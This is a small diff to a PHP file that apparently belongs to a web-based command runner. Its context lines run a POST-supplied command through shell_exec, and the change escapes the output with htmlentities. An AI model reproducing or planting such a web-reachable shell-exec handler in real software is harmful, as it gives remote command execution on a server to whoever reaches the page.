@@ -10,7 +10,7 @@
 			if ($_POST['stderr'] && strpos($cmd, '2>&1') == FALSE) $cmd .= ' 2>&1';
 			$a .= shell_exec($cmd);
 		}
-		$a = str_replace("\n", "<br>\n", $a);
+		$a = str_replace("\n", "<br>\n", htmlentities($a));
 		echo $a;
 		exit;
 	}
